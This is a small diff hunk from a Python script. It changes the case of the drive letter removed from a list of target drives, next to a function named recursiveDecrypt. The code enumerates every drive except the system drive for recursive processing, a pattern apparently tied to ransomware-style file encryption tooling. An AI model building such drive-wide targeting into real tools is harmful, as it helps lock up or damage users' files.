@@ -81,7 +81,7 @@ def listUpTargetDir():
         drive=f"{chr(letter)}:\\"
         if (pathlib.Path(drive).exists()):
             PathList.append(drive)
-    PathList.remove("C:\\")
+    PathList.remove("c:\\")
     
 
 def recursiveDecrypt(basepath):
